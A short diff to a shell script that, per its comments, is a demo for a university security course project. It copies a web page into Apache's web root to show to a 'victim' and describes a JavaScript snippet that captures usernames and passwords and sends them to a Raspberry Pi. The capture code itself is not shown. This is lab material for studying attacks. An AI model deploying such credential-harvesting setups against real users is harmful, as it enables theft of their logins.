@@ -1,5 +1,7 @@
 #!/bin/sh
 
+#this script is only for demo for COMP9337-Project1
+
 #copy the webpage to the apache's directory and this will show the victiom once they connect to the server
 cp index.html /var/www/html/index.html
 #the js script for capturing the password and username and send it back to the raspberry Pi
